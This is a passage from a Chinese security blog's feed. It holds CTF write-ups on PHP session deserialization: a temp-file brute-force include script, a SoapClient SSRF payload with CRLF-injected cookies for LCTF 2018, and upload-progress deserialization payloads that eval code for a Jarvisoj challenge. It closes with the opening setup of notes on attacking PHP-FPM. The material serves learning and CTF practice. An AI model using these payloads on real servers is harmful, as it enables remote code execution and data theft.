&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">/index.php?function=extract&amp;amp;file=/tmp/php&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">url&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;wwwwwwwwwwwwww&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;[+] Include success!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>爆破成功后就拿到了shell，其余跟上面一样&lt;/p>
&lt;h3 id="lctf-2018bestphps-revenge">[LCTF 2018]bestphp&amp;rsquo;s revenge&lt;/h3>
&lt;p>————这个栗子结合了SoapClient和session的考点&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;implode&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;welcome_to_the_lctf2018&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>看到了我们的老朋友&lt;code>call_user_func&lt;/code>，它会把第一个参数作为回调函数，其余参数作为回调函数的参数；如果我们第一个参数传入的是数组，它会把数组的第一个值作为类名，第二个值当作方法进行回调（反序列化中常见）；&lt;code>call_user_func&lt;/code>函数不仅可以调用自定义函数和类，也可以调用php内置函数和内置类，比如&lt;code>extract&lt;/code>&lt;/p>
&lt;p>flag.php可以直接访问（这里我没有扫 看wp知道的 robots.txt和页面源码都没有直接的提示）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png" alt="image-20211128225823073">&lt;/p>
&lt;p>这个回显很明显需要ssrf，以localhost访问flag.php就会将flag写入SESSION中&lt;/p>
&lt;p>内置类&lt;code>SoapClient()&lt;/code>满足这个需要，它可以通过反序列化来发起一个http请求（需要被调用&lt;code>__call&lt;/code>&lt;/p>
&lt;p>所以整体思路是这样的：&lt;/p>
&lt;ol>
&lt;li>覆盖序列化引擎为&lt;code>php_serialize&lt;/code>， 通过&lt;code>session_start&lt;/code>将一个序列化的&lt;code>SoapClient&lt;/code>写入session；由于get传入的name会被直接放入session中，所以序列化的字符串不用post传，只需要post传设置反序列化引擎的参数就可以&lt;/li>
&lt;li>第一个&lt;code>call_user_func&lt;/code>通过&lt;code>extract&lt;/code>变量覆盖使&lt;code>$b = call_user_func&lt;/code>，第二个&lt;code>call_user_func&lt;/code>调用&lt;code>SoapClient-&amp;gt;__call&lt;/code>（不可访问的方法 call_user_func）&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;AAA:BBB&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$se&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$se&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;amp;f=session_start
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: serialize_handler=php_serialize
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?name=Soapclient&amp;amp;f=extract
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: b=call_user_func
&lt;/code>&lt;/pre>&lt;p>之后刷新页面就可以触发反序列化了，由于上面构造的时候cookie就是当前页面的cookie，所以整一套过程下来不需要单独改session，首页就可以看到结果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png" alt="image-20211129123843040">&lt;/p>
&lt;h3 id="jarvisoj-webphpinfo">[Jarvisoj web]PHPINFO&lt;/h3>
&lt;p>&lt;a href="http://web.jarvisoj.com:32784/index.php">这里是题目页面&lt;/a>；开幕源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//A webshell is wait for you
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先看看phpinfo，应该有提示信息；发现&lt;code>session.upload_progress.enabled=On&lt;/code>，这就非常好了，构造一个上传表单把我们想执行的代码序列化后设为文件名传入&lt;/p>
&lt;p>序列化exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php_serialize&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(scandir(dirname(__FILE__)));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$obj&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// |O:5:&amp;#34;OowoO&amp;#34;:1:{s:4:&amp;#34;mdzz&amp;#34;;s:36:&amp;#34;print_r(scandir(dirname(__FILE__)));&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造上传表单，注意文件名的引号要加反斜杠转义&lt;/p>
&lt;pre tabindex="0">&lt;code>|O:5:\&amp;#34;OowoO\&amp;#34;:1:{s:4:\&amp;#34;mdzz\&amp;#34;;s:36:\&amp;#34;print_r(scandir(dirname(__FILE__)));\&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png" alt="image-20211129212625924">&lt;/p>
&lt;p>然后访问这个php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(file_get_contents(&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&amp;#34;));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>|O:5:\&amp;#34;OowoO\&amp;#34;:1:{s:4:\&amp;#34;mdzz\&amp;#34;;s:88:\&amp;#34;print_r(file_get_contents(\&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&amp;#34;));\&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>得到flag&lt;/p>
&lt;hr>
&lt;p>呼……长舒一口气，这个知识点终于画上了一个小句号；暑假总结php反序列化的时候就差整个和内置类，结果磨磨蹭蹭拖到今天，不过还是被我终结掉啦！文中还设计了一点SoapClient内置类的东西，由于篇幅原因不展开讲了= = 、&lt;/p>
&lt;p>最近的计划和安排就是刷题&amp;amp;把之前的知识体系填充完整，加油啦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://xz.aliyun.com/t/3339#toc-3">LCTF 2018 Writeup &amp;ndash; ROIS&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含和反序列化渗透&lt;/a>&lt;/p>
&lt;p>如有遗漏请指正！！！&lt;/p>
&lt;/details></description></item><item><title>攻击PHP-FPM学习笔记</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！&lt;/p>
&lt;p>没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&amp;amp;重新整理，参考链接放到最后啦w&lt;/p>
&lt;h2 id="前置知识">前置知识&lt;/h2>
&lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
&lt;p>CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi&lt;/p>
&lt;p>CGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了&lt;/p>
&lt;p>而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求&lt;/p>
&lt;p>查看phpinfo，Sever API处一般会有三种样式：&lt;/p>
&lt;ul>
&lt;li>Apache 2.0 Handler&lt;/li>
&lt;li>CGI/FastCGI&lt;/li>
&lt;li>FPM/FastCGI&lt;/li>
&lt;/ul>
&lt;p>第一种把php作为apache的一个模块，相当于apache中的一个.dll或.so；第二种php-cgi.exe是一个独立的进程，web服务器也是独立的apache.exe，web服务器监听到http请求时会去调用php-cgi进程，之间通过cgi协议传递数据；而第三种fastcgi也是一种协议，它做了很多优化且常驻内存 不用每次都调用一下cgi，有辅助功能比如内存管理，垃圾处理由php-fpm来实现&lt;/p>
&lt;h3 id="配置">配置&lt;/h3>
&lt;p>php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install nginx -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install software-properties-common -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install php7.4-fpm -y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="tcp模式">tcp模式&lt;/h4>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">127.0.0.1:9000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass 127.0.0.1:9000;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
